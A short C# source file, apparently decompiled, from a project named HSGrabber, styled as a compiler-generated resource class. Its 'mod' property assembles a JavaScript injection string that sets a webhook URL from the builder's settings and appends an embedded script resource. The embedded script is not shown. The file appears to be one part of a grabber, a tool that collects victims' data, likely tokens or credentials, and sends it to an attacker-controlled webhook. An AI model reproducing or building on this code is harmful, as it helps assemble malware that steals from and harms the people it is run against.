using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.Resources;
using System.Runtime.CompilerServices;
using HSGrabber;
using HSGrabber.Properties;

namespace HSGrabber_Mod
{
	[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
	[DebuggerNonUserCode]
	[CompilerGenerated]
	internal class Mod
	{
		internal Mod()
		{
		}

		[EditorBrowsable(EditorBrowsableState.Advanced)]
		internal static ResourceManager ResourceManager
		{
			get
			{
				bool flag = Mod.resourceMan == null;
				if (flag)
				{
					Mod.resourceMan = new ResourceManager("HSGrabber.Mod", typeof(Mod).Assembly);
				}
				return Mod.resourceMan;
			}
		}
		[EditorBrowsable(EditorBrowsableState.Advanced)]
		internal static CultureInfo Culture
		{
			get
			{
				return Mod.resourceCulture;
			}
			set
			{
				Mod.resourceCulture = value;
			}
		}

		internal static string mod
		{
			get
			{
				return "var webhookUrl = \"" + Settings.Url + "\";" + Resources.ResourceManager.GetString("TextFile2");
			}
		}

		private static ResourceManager resourceMan;

		private static CultureInfo resourceCulture;
	}
}
